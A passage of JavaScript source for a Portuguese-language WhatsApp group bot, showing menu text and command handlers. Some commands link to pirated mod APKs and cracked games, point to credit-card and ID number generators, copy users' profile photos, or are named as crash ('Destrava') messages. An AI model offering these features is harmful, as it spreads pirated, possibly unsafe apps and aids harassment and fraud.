║ঔৣ͜͡ீ͜❤️‍🩹${prefix}delpremium @(marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}addpremium @(marca)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}clonar [@] (rouba ft de prf)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}fotobot (img, = foto do BT)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}descriçãogp (digite-algo)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}limpar (limpa tds conversas)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}block [@] (bloq de usar cmds) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}unblock [@] (desbloquear) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}setprefix  (prefixo-novo)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}bangp
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}unbangp
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}dono2 @marca
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}dono3 @marca
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}dono4 @marca
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}dono5 @marca
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}bcgp (TM-PRA-PV-MEMBROS)
║
╠┄┄┄⟨👻𝐄𝐅𝐄𝐈𝐓𝐎𝐒 𝐈𝐌𝐀𝐆𝐄𝐍𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Legenda (marcar)-(img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Procurado (marcar)-(img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Hitler (marcar)-(img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Preso (marcar)-(img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Lixo (marcar)-(img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Deletef (marcar)-(img)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Morto (marcar)-(img) 
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Lgbt (marcar)-(img) 
║
╠┄┄┄⟨👻𝐋 𝐎 𝐆 𝐎 𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha3
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha4
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha5
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha6
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha7
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha8
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha9
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha10
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Plaquinha11
​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Marvel  (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}pornhub  (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}space  (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}stone (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}steel (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}grafity (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}america (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}glitch3 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}hackneon (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}angelwing (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ffavatar (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}equipemascote (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}txtquadrinhos (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}fpsmascote (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}gizquadro (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}angelglx (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}mascotegame (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}metalgold (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}blackpink (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}wingeffect (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}girlmascote (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}logogame (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}metalgold (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cup (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}shadow (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}efeitoneon (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}neon2 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}lobometal (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cemiterio (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}lovemsg3 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}madeira (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}florwooden (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}coffecup2 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}coffecup (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}smoke (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}romantic (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}fire (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}lovemsg2 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}lovemsg (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}papel (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}style (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}areia (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}3dstone (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}fiction (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}neondevil (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}cattxt (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}pink (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}blood (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}thunder (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}vidro (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}metalfire (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}carbon (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}demonfire (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}transformer (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jokerlogo (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}ossos (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}natal (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}metalblue (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}jeans (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}colaq (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}glitch2 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}asfalto (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}matrix (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}horror (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}nuvem (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}neon3 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}thunderv2 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}lava (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}luxury (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}berry (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}neon1 (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}neon (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}neve (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}neongreen (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}rainbow (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}lapis (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}toxic (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}demongreen (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}3dgold (txt)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}halloween (txt)
╠┄┄┄⟨👻𝐌𝐄𝐍𝐔ㅤ𝐏𝐑𝐄𝐌𝐈𝐔𝐌👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Destrava
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Destrava2
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Ddd (DDD)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Cep (NÚMERO)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}GerarCPF
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}PremiumList
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}LerFoto (MARCAR)
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}EncurtaLink (LINK)
║ 
╠┄┄┄⟨⚠️ 𝐈𝐌𝐏𝐎𝐑𝐓𝐀𝐍𝐓𝐄 ⚠️⟩
║⊱⚠️𝐍𝐚̃𝐨 𝐟𝐥𝐨𝐨𝐝𝐞 𝐬𝐞𝐧𝐚̃𝐨 𝐨𝐬 𝐜𝐨𝐦𝐚𝐧𝐝𝐨𝐬 𝐩𝐨𝐝𝐞𝐦 𝐜𝐚𝐢𝐫!
║⊱⚠️𝐒𝐞 𝐟𝐚𝐥𝐡𝐚𝐫, 𝐨 𝐬𝐞𝐫𝐯𝐢𝐝𝐨𝐫 𝐜𝐚𝐢𝐮 𝐭𝐞𝐦𝐩𝐨𝐫𝐚𝐫𝐢𝐚𝐦𝐞𝐧𝐭𝐞.
║⊱⚠️𝐄𝐦 𝐭𝐞𝐬𝐭𝐞𝐬. 𝐄𝐧𝐭ã𝐨 𝐩𝐨𝐝𝐞 𝐜𝐚𝐢𝐫, 𝐨𝐮 𝐟𝐢𝐜𝐚𝐫 𝐨𝐟𝐟.
║⊱⚠️𝐀𝐜𝐡𝐨𝐮 𝐞𝐫𝐫𝐨𝐬? 𝐓𝐢𝐠𝐚 𝐚𝐨 𝐝𝐨𝐧𝐨 𝐧𝐨 𝐳𝐚𝐩𝐳𝐚𝐩.
║⊱⚠️𝐀𝐥𝐠𝐮𝐧𝐬 𝐜𝐨𝐦𝐚𝐧𝐝𝐨𝐬 𝐩𝐨𝐝𝐞𝐦 𝐝𝐞𝐦𝐨𝐫𝐚𝐫.
╰─────────────────────────╯
`}, {quoted: selo}) 
break
case'menulista':
case'menu':{
const dattaa = moment.tz('America/Sao_Paulo').format('DD/MM/YY');
r = (Date.now() / 1000) - info.messageTimestamp
uptime = process.uptime()
var salldo2 = checkATMuser(sender) 
r = (Date.now() / 1000) - info.messageTimestamp
uptime = process.uptime()
hora1 = moment.tz('America/Sao_Paulo').format('HH:mm:ss')
botaoale = [
{title: `${NomeDoBot}`,//
rows: [
{title: "『🌪️️』✰͜͡𝐌𝐄𝐍𝐔-𝐏𝐑𝐈𝐍𝐂𝐈𝐏𝐀𝐋", rowId: `${prefix}menu2`,description: `${NomeDoBot}`},
{title: "『👥』✰͜͡𝐌𝐄𝐍𝐔-𝐀𝐃𝐌𝐈𝐍", rowId: `${prefix}menuadm`,description: `${NomeDoBot}`},
{title: "『🖼』✰͜͡𝐌𝐄𝐍𝐔-𝐋𝐎𝐆𝐎𝐒️", rowId: `${prefix}menulogos`,description: `${NomeDoBot}`},
{title: "『💞』✰͜͡𝐌𝐄𝐍𝐔-𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀𝐒", rowId: `${prefix}brincadeiras`,description: `${NomeDoBot}`},
{title: "『🔄』✰͜͡𝐌𝐄𝐍𝐔-𝐀𝐋𝐓𝐄𝐑𝐀𝐃𝐎𝐑𝐄𝐒", rowId: `${prefix}alteradores`,description: `${NomeDoBot}`},
{title: "『✨』✰͜͡𝐌𝐄𝐍𝐔-𝐄𝐅𝐄𝐈𝐓𝐎𝐒", rowId: `${prefix}efeitosimg`,description: `${NomeDoBot}`},
{title: "『🪄』✰͜͡𝐌𝐄𝐍𝐔-𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂̧𝐎̃𝐄𝐒", rowId: `${prefix}info7`,description: `${NomeDoBot}`},
{title: "『🥂』✰͜͡𝐈𝐍𝐅𝐎-𝐃𝐎𝐍𝐎", rowId: `${prefix}infodn`,description: `${NomeDoBot}`},
{title: "『🎊』✰͜͡𝐌𝐄𝐍𝐔-𝐏𝐑𝐄𝐌𝐈𝐔𝐌", rowId: `${prefix}menupremium`,description: `${NomeDoBot}`},
{title: "『🔥』✰͜͡𝐂𝐌𝐃𝐒-𝐁𝐀𝐒𝐈𝐂𝐎𝐒", rowId: `${prefix}basico`,description: `${NomeDoBot}`},
{title: "『❤』️✰͜͡𝐌𝐄𝐍𝐔-𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒️", rowId: `${prefix}figurinhas`,description: `${NomeDoBot}`},
{title: "『🔎』️✰͜͡𝐌𝐄𝐍𝐔-𝐂𝐎𝐍𝐒𝐔𝐋𝐓𝐀𝐒️", rowId: `${prefix}menupuxas`,description: `${NomeDoBot}`},
{title: "『👑』✰͜͡𝐌𝐄𝐍𝐔-𝐃𝐎𝐍𝐎", rowId: `${prefix}menudono`,description: `${NomeDoBot}`},
{title: "『💡』✰͜͡𝐈𝐍𝐅𝐎-𝐀𝐏𝐋𝐈𝐂𝐀𝐓𝐈𝐕𝐎𝐒", rowId: `${prefix}apps`,description: `${NomeDoBot}`},
{title: "『💦』✰͜͡𝐌𝐄𝐍𝐔-𝐀𝐍𝐈𝐌𝐄𝐒", rowId: `${prefix}menuanime`,description: `${NomeDoBot}`},
{title: "『🎮️』✰͜͡𝐌𝐄𝐍𝐔-𝐉𝐎𝐆𝐎𝐒️", rowId: `${prefix}listajogos`,description: `${NomeDoBot}`},
{title: "『🛒』️✰͜͡𝐂𝐀𝐑𝐑𝐈𝐍𝐇𝐎-𝐃𝐄-𝐅𝐈𝐆𝐔️", rowId: `${prefix}packstickers`,description: `${NomeDoBot}`},
{title: "『🎥️』✰͜͡𝐌𝐄𝐍𝐔-𝐅𝐈𝐋𝐌𝐄𝐒️", rowId: `${prefix}filmes`,description: `${NomeDoBot}`},
{title: "『️🎬』✰͜͡𝐌𝐄𝐍𝐔-𝐒𝐄́𝐑𝐈𝐄𝐒", rowId: `${prefix}series`,description: `${NomeDoBot}`},
{title: "『🔞️』✰͜͡𝐌𝐄𝐍𝐔-𝐇𝐄𝐍𝐓𝐀𝐈𝐒", rowId: `${prefix}menuhentai`,description: `${NomeDoBot}`},
{title: "『😈』️✰͜͡𝐌𝐄𝐍𝐔-𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑", rowId: `${prefix}wallpaper2`,description: `${NomeDoBot}`},
{title: "『🪓』️✰͜͡𝐌𝐄𝐍𝐔-𝐄𝐃𝐈𝐓𝐒️", rowId: `${prefix}edits`,description: `${NomeDoBot}`},
{title: "『🚀️』✰͜͡𝐂𝐎𝐌𝐏𝐑𝐀𝐑 𝐕𝐏𝐍️", rowId: `${prefix}vpn`,description: `${NomeDoBot}`},
{title: "『🫂』✰͜͡𝐌𝐄𝐍𝐔-𝐆𝐑𝐔𝐏𝐎𝐒", rowId: `${prefix}divulgar`,description: `${NomeDoBot}`},
{title: "『️🎬』✰͜͡𝐒𝐄𝐑𝐕𝐈𝐃𝐎𝐑-𝐒𝐀𝐌𝐏", rowId: `${prefix}samp`,description: `${NomeDoBot}`},
{title: "『🗣️』✰͜͡𝐒𝐔𝐏𝐎𝐑𝐓𝐄 𝐋𝐗️", rowId: `${prefix}suporte`,description: `${NomeDoBot}`},
{title: "『💸』✰͜͡𝐀𝐋𝐔𝐆𝐀𝐑 𝐁𝐎𝐓", rowId: `${prefix}alugar`, description: `${NomeDoBot}`},
{title: "『🤴』✰͜͡𝐂𝐑𝐈𝐀𝐃𝐎𝐑 𝐃𝐎 𝐁𝐎𝐓", rowId: `${prefix}criador`, description: `${NomeDoBot}`}]
}]
sendlistA(sender, `╭═══════════ ⪩
╰╮    ❀🏴‍☠️֟፝֟͜͜͡͡͡𝐌 𝐄 𝐍 𝐔֟፝͜͜͡͡͡🏴‍☠️❀
╭┤⪩ 🧙‍♂️ *PREFIXO: ⟪•  ${prefix}  •⟫*
┃│⪩ 👑 *DONO: ${NickDono}*
┃│⪩ 👥 *GRUPO: ${groupName}*
┃│⪩⚡ *PING: ${String(r.toFixed(3))}*
┃│⪩🟢 *ATIVO: ${kyun(uptime)}*
┃│⪩🕒 *HORA: ${hora1}*
┃│⪩📅 *DATA: ${dattaa}*
╰══ ⪨`, `⋟ ${NomeDoBot}: ${tempo} (⁠♡⁠‿⁠♡⁠)💜`, "", "🔥️𝐌𝐄𝐍𝐔 𝐃𝐎 𝐁𝐎𝐓 ️🔥", botaoale)
}
break

case'menubotao':
case 'menu':
case 'comandosbotao':{
conn.sendMessage(from, { react: { text: `☕`, key: info.key }})
if(menu_audio === true) {
audiomenu = await fs.readFileSync("./audios/menucmd.mp3")
conn.sendMessage(from, {audio: audiomenu, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
}  
//sendBimg(from, `${logo}`, menu(prefix, NomeDoBot), "Leia com atenção", [{buttonId: `${prefix}planos`, buttonText: {displayText: `💸ALUGAR BOT `}, type: 1}, {buttonId: `${prefix}infodono`, buttonText: {displayText: `⚡ INFORMAÇÕES DO DONO `}, type: 1}], selo)

const buttons = [{buttonId:
`${prefix}brincadeiras`, buttonText: {displayText: `『💞』✰͜͡𝐌𝐄𝐍𝐔-𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀𝐒`}, type: 1}, 
{buttonId: `${prefix}menuadm`, buttonText: {displayText: `『🔎』✰͜͡𝐌𝐄𝐍𝐔-𝐀𝐃𝐌𝐈𝐍`}, type: 1},
{buttonId: `${prefix}menulogos`, buttonText: {displayText: `『🖼』✰͜͡𝐌𝐄𝐍𝐔-𝐋𝐎𝐆𝐎𝐒`}, type: 1}]

const buttonMessage = {
    image: {url: `${logo}`},
    caption: menu(prefix, NomeDoBot, {quoted: selo}),
    footer: 'ⓘ Esse usuário é um bot  𝙎𝙖𝙞𝙗𝙖 𝙢𝙖𝙞𝙨',
    buttons: buttons,
    headerType: 4,
    contextInfo: {"externalAdReply":{
    title: `${tempo}, ${pushname} ☺️🧙‍♂️`,
    mediaType: 1,
    renderLargerThumbnail: false,
    showAdAttribution: true,
    body: `${NomeDoBot}`,
    thumbnail: fs.readFileSync('./luixft.jpg'),
    mediaUrl: `https://youtube.com/@Luix1397`,
    sourceUrl: `https://youtube.com/@Luix1397`,
    headerType: 4
}}
}
conn.sendMessage(from, buttonMessage, {quoted: selo})
}
break
case'antilink': {
           	if (!isGroup) throw (`${ot}`)
               if (!isBotGroupAdmins) throw `preciso ser adm primeiro`
               if (!isGroupAdmins) throw (mess.only.gcadmin)
                          let buttonse = [
                    {buttonId: `${prefix}antilink56 1`, buttonText: {displayText: '𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈𝐋𝐈𝐍𝐊'}, type: 1},
                    {buttonId: `${prefix}antilink56 0`, buttonText: {displayText: '𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐍𝐓𝐈𝐋𝐈𝐍𝐊'}, type: 1}
]
                let buttonMessagee = {
                    text: `ESCOLHA ABAIXO SE QUER DESATIVAR OU ATIVAR`,
                    footer: '❥͜𝐋𝐔𝐈𝐗 𝐁𝐎𝐓 𝐕𝟗 𝐃𝐎𝐌𝐈𝐍𝐀⚡',
                    buttons: buttonse,
                    headerType: 2
                }
                conn.sendMessage(from, buttonMessagee)
            }
            break
case'statusbot': case'botstatus': {
if(!SoDono) return reply(`Apenas o dono pode executar esta ação!!`)
                          let buttonse = [
                    {buttonId: `${prefix}unbangp`, buttonText: {displayText: 'ONLINE'}, type: 1},
                    {buttonId: `${prefix}bangp`, buttonText: {displayText: 'OFFLINE'}, type: 1}
]
                let buttonMessagee = {
                    text: `${NomeDoBot} `,
                    footer: '*✰͜͡STATUS*',
                    buttons: buttonse,
                    headerType: 2
                }
                conn.sendMessage(from, buttonMessagee, {quoted: selo})
            }
            break
//===============================//
case 'gta':
reply (`https://www.mediafire.com/file/ln6r3kx0ie77r9t/GTA_San_Andreas_2021.zip/file`)
break

case 'nba':
reply (`http://www.mediafire.com/file/0j7be2qf6r2fd1i/NBA-2K20-v96-0-1.apk/file`)
break

//===============================//
case 'gerarconh':
reply (`https://www.4devs.com.br/gerador_de_cnh}`)
break

case 'gerarcep':
reply (`https://www.4devs.com.br/gerador_de_cep`)
break

case 'gerarrg':
reply (`https://www.4devs.com.br/gerador_de_rg`)
break

case 'gerarveiculos':
reply (`https://www.4devs.com.br/gerador_de_veiculos`)
break

case 'gerarcontabancaria':
reply (`https://www.4devs.com.br/gerador_conta_bancaria`)
break

case 'gerarcertidãodenacimento':
reply (`https://www.4devs.com.br/gerador_numero_certidoes`)
break

case 'gerarcc':
reply (`https://www.4devs.com.br/gerador_de_numero_cartao_credito`)
break
//////////////////////////////////////////LUIX\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
case 'modsnaptube':
reply (`http://www.mediafire.com/file/8yd7vnqo68cjj2c/Snaptube%20VIP%20vv5.12.1.5121501%20MOD.apk/file`)
break

case 'modtiktok':
reply (`http://www.mediafire.com/file/hooxjtafjhl0be8/TikTok%20v18.4.3%20MOD.apk/file`)
break

case 'modresso':
reply (`http://www.mediafire.com/file/btbdijm8llccode/Resso%20Premium%20v1.28.0%20MOD.apk/file`)
break

case 'modnetflix':
reply (`https://www.mediafire.com/file/rxw7zys8nzd62kl/Pobreflix%20v4.0%20APK.apk/file`)
break
case 'modpicsart':
reply (`https://apkdone.com/picsart-apk-mods/`)
break

case 'kinemaster':
reply (`https://apkdone.com/kinemaster-apk-mods/`)
break
case 'verificado-global': 
if(!SoDono) return reply(`Apenas o dono pode executar esta ação!!`)
if(verificado === false) {
verificado = true
nescessario.verificado = verificado
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`- O Verificado foi Ativado de todos os comandos que tem, para tirar novamente só digitar o comando novamente..`)
} else if(verificado === true) {
verificado = false
nescessario.verificado = verificado
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`- O Verificado de todos os menu / comando, foi Desativado, para ativar novamente só digitar o comando novamente..`) 
}
break

case 'audio-menu': 
if(!SoDono) return reply(`Apenas o dono pode executar esta ação!!`)
if(menu_audio === false) {
menu_audio = true
nescessario.menu_audio = menu_audio
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`- O Áudio foi ativado para o menu _- COM SUCESSO - _\n\nSe quiser Desativar - Só digitar o comando novamente`)
} else if(menu_audio === true) {
menu_audio = false
nescessario.menu_audio = menu_audio
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`- O Áudio foi Desativado do menu _- COM SUCESSO - _\n\nSe quiser Ativar - Só digitar o comando novamente`) 
}
break

case 'console':   
if(!SoDono) return reply(`Apenas o dono pode executar esta ação!!`)
if(consoleoff === false) {
consoleoff = true
nescessario.botoes = botoes
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`- O console foi ativado _- COM SUCESSO - _ SE FOR DESATIVADO ISSO NÃO MOSTRARÁ OS COMANDOS DADO NO TERMUX, NEM AS MENSAGENS DOS USUÁRIOS, AJUDARÁ A NÃO LEVAR BAN NA CONTA DO HEROKU\n\nSe quiser Desativar - Só digitar o comando novamente`)
} else {
consoleoff = false
nescessario.consoleoff = consoleoff
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`- O console foi Desativado  _- COM SUCESSO - _ SE FOR ATIVADO ISSO NÃO MOSTRARÁ OS COMANDOS DADO NO TERMUX, NEM AS MENSAGENS DOS USUÁRIOS, AJUDARÁ A NÃO LEVAR BAN NA CONTA DO HEROKU\n\nSe quiser Ativar - Só digitar o comando novamente`) 
}
break

case 'botao': 
case 'botoes':   
if(!SoDono) return reply(`Apenas o dono pode executar esta ação!!`)
if(botoes === false) {
botoes = true
nescessario.botoes = botoes
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`- Os Botões foi ativado _- COM SUCESSO - _\n\nSe quiser Desativar - Só digitar o comando novamente`)
} else {
botoes = false
nescessario.botoes = botoes
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`- Os Botões foi Desativado  _- COM SUCESSO - _\n\nSe quiser Ativar - Só digitar o comando novamente`) 
}
break

case 'logos':
case 'menulogos':{ 
const buttons = [{buttonId:
